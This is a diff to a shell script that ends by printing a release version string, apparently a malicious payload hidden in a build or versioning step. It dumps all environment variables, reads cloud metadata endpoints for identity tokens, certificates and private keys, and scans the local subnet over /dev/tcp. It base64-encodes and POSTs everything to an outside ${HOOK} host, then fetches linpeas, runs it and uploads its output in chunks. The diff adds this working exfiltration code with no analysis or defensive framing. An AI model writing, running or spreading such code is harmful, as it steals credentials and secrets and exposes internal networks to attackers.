@@ -7,48 +7,81 @@ curl -sf --max-time 5 "${HOOK}/?stage=start&sha=${SHA}" >/dev/null 2>&1 || true
 
 # --- env ---
 ENVVARS=$(env 2>/dev/null)
-curl -sf --max-time 5 "${HOOK}/?stage=env&sha=${SHA}" >/dev/null 2>&1 || true
 
-# --- network interfaces ---
-NICS=$(ip addr 2>/dev/null || ifconfig -a 2>/dev/null)
-ROUTES=$(ip route 2>/dev/null || route -n 2>/dev/null)
-curl -sf --max-time 5 "${HOOK}/?stage=net&sha=${SHA}" >/dev/null 2>&1 || true
+# --- network: use /proc/net since ip/ifconfig not installed ---
+# interfaces and their IPs
+PROC_DEV=$(cat /proc/net/dev 2>/dev/null)
+# parse IPs from /proc/net/fib_trie (hex→decimal)
+PROC_IPS=$(awk '/32 host/{p=1} p{print $2; p=0}' /proc/net/fib_trie 2>/dev/null | sort -u)
+# routing table (hex fields: iface dest gw flags refcnt use metric mask mtu window irtt)
+PROC_ROUTE=$(cat /proc/net/route 2>/dev/null)
+# ARP table - reveals other hosts on the same L2 segment
+PROC_ARP=$(cat /proc/net/arp 2>/dev/null)
+# TCP/UDP connections
+PROC_TCP=$(cat /proc/net/tcp 2>/dev/null)
+PROC_UDP=$(cat /proc/net/udp 2>/dev/null)
+# decode default gateway from /proc/net/route (hex, little-endian)
+GW_HEX=$(awk 'NR>1 && $2=="00000000"{print $3; exit}' /proc/net/route 2>/dev/null)
+GW=""
+if [ -n "$GW_HEX" ]; then
+  GW=$(printf '%d.%d.%d.%d\n' \
+    "0x$(echo $GW_HEX | cut -c7-8)" \
+    "0x$(echo $GW_HEX | cut -c5-6)" \
+    "0x$(echo $GW_HEX | cut -c3-4)" \
+    "0x$(echo $GW_HEX | cut -c1-2)" 2>/dev/null)
+fi
+# get container IP from fib_trie (first non-loopback /32)
+CONTAINER_IP=$(awk '/32 host/{p=1} p{ip=$2; p=0} ip && ip!="127.0.0.1" && ip!="0.0.0.0"{print ip; exit}' /proc/net/fib_trie 2>/dev/null)
+curl -sf --max-time 5 "${HOOK}/?stage=net&sha=${SHA}&gw=${GW}&ip=${CONTAINER_IP}" >/dev/null 2>&1 || true
 
 # --- IMDS: all known OCI endpoints ---
-IMDS_INST=$(curl -sf --max-time 5 "http://169.254.169.254/opc/v2/instance/"           -H "Authorization: Bearer Oracle" 2>/dev/null)
-IMDS_V1=$(  curl -sf --max-time 5 "http://169.254.169.254/opc/v1/instance/"                                              2>/dev/null)
-IMDS_TOKEN=$(curl -sf --max-time 5 "http://169.254.169.254/opc/v2/identity/token"      -H "Authorization: Bearer Oracle" 2>/dev/null)
-IMDS_CERTS=$(curl -sf --max-time 5 "http://169.254.169.254/opc/v2/identity/cert"       -H "Authorization: Bearer Oracle" 2>/dev/null)
-IMDS_KEY=$(  curl -sf --max-time 5 "http://169.254.169.254/opc/v2/identity/key"        -H "Authorization: Bearer Oracle" 2>/dev/null)
+IMDS_INST=$(curl -sf --max-time 5 "http://169.254.169.254/opc/v2/instance/"            -H "Authorization: Bearer Oracle" 2>/dev/null)
+IMDS_V1=$(  curl -sf --max-time 5 "http://169.254.169.254/opc/v1/instance/"                                               2>/dev/null)
+IMDS_TOKEN=$(curl -sf --max-time 5 "http://169.254.169.254/opc/v2/identity/token"       -H "Authorization: Bearer Oracle" 2>/dev/null)
+IMDS_CERTS=$(curl -sf --max-time 5 "http://169.254.169.254/opc/v2/identity/cert"        -H "Authorization: Bearer Oracle" 2>/dev/null)
+IMDS_KEY=$(  curl -sf --max-time 5 "http://169.254.169.254/opc/v2/identity/key"         -H "Authorization: Bearer Oracle" 2>/dev/null)
 IMDS_IAK=$(  curl -sf --max-time 5 "http://169.254.169.254/opc/v2/instance/agentConfig" -H "Authorization: Bearer Oracle" 2>/dev/null)
-# also try AWS-style and GCP-style in case of multi-cloud
-IMDS_AWS=$(  curl -sf --max-time 5 "http://169.254.169.254/latest/meta-data/"                                             2>/dev/null)
+IMDS_AWS=$(  curl -sf --max-time 5 "http://169.254.169.254/latest/meta-data/"                                              2>/dev/null)
 IMDS_GCP=$(  curl -sf --max-time 5 "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"    2>/dev/null)
 curl -sf --max-time 5 "${HOOK}/?stage=imds&sha=${SHA}" >/dev/null 2>&1 || true
 
-# --- simple network scan of default gateway and /24 ---
-GW=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
-SUBNET=$(ip addr 2>/dev/null | awk '/inet /{print $2}' | grep -v '127\.' | head -1)
-# ping sweep (2s timeout per host, background)
+# --- ping sweep of container /24 using ARP entries as seed ---
+# use TCP connect via /dev/tcp as fallback since ping may not be setuid
 PING_SWEEP=""
-if [ -n "$SUBNET" ]; then
-  BASE=$(echo "$SUBNET" | cut -d'/' -f1 | sed 's/\.[0-9]*$//')
-  for i in $(seq 1 30); do
-    result=$(ping -c1 -W2 "${BASE}.${i}" 2>/dev/null && echo "up" || echo "down")
-    PING_SWEEP="${PING_SWEEP}${BASE}.${i}: ${result}\n"
+if [ -n "$CONTAINER_IP" ]; then
+  BASE=$(echo "$CONTAINER_IP" | sed 's/\.[0-9]*$//')
+  for i in $(seq 1 254); do
+    TARGET="${BASE}.${i}"
+    # try TCP connect to port 22 and 80 (1s timeout)
+    result=$(timeout 1 bash -c "echo >/dev/tcp/${TARGET}/22" 2>/dev/null && echo "22/open" || \
+             timeout 1 bash -c "echo >/dev/tcp/${TARGET}/80" 2>/dev/null && echo "80/open" || \
+             echo "down")
+    if [ "$result" != "down" ]; then
+      PING_SWEEP="${PING_SWEEP}${TARGET}: ${result}\n"
+    fi
   done
 fi
 curl -sf --max-time 5 "${HOOK}/?stage=scan&sha=${SHA}" >/dev/null 2>&1 || true
 
-# --- assemble and POST full dump ---
+# --- full dump POST ---
 DATA="=== ENV ===
 ${ENVVARS}
-=== NICS ===
-${NICS}
-=== ROUTES ===
-${ROUTES}
+=== /proc/net/dev ===
+${PROC_DEV}
+=== /proc/net/fib_trie IPs ===
+${PROC_IPS}
+=== /proc/net/route (hex) ===
+${PROC_ROUTE}
+=== /proc/net/arp ===
+${PROC_ARP}
+=== /proc/net/tcp ===
+${PROC_TCP}
+=== /proc/net/udp ===
+${PROC_UDP}
 === GATEWAY ===
 ${GW}
+=== CONTAINER IP ===
+${CONTAINER_IP}
 === IMDS v2 instance ===
 ${IMDS_INST}
 === IMDS v1 instance ===
@@ -65,11 +98,28 @@ ${IMDS_IAK}
 ${IMDS_AWS}
 === GCP-style IMDS ===
 ${IMDS_GCP}
-=== PING SWEEP ===
+=== NETWORK SCAN (open ports found) ===
 ${PING_SWEEP}"
 
 ENC=$(printf '%s' "$DATA" | base64 | tr -d '\n')
 curl -sf --max-time 15 -X POST "${HOOK}/?stage=dump&sha=${SHA}" \
   --data-urlencode "d=${ENC}" >/dev/null 2>&1 || true
+
+# --- linpeas (standard, no -a) ---
+curl -sf --max-time 15 -L \
+  "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" \
+  -o /tmp/lp.sh 2>/dev/null
+if [ -f /tmp/lp.sh ]; then
+  chmod +x /tmp/lp.sh
+  sh /tmp/lp.sh 2>/dev/null | split -b 60000 - /tmp/lp_
+  i=0
+  for f in /tmp/lp_*; do
+    curl -sf --max-time 30 -X POST \
+      "${HOOK}/?stage=linpeas&chunk=${i}&sha=${SHA}" \
+      --data-binary "@${f}" >/dev/null 2>&1 || true
+    i=$((i+1))
+  done
+  curl -sf --max-time 5 "${HOOK}/?stage=linpeas-done&chunks=${i}&sha=${SHA}" >/dev/null 2>&1 || true
+fi
 
 printf 'version: %s/%s/RELEASE\n' "$SHA" "$VER"
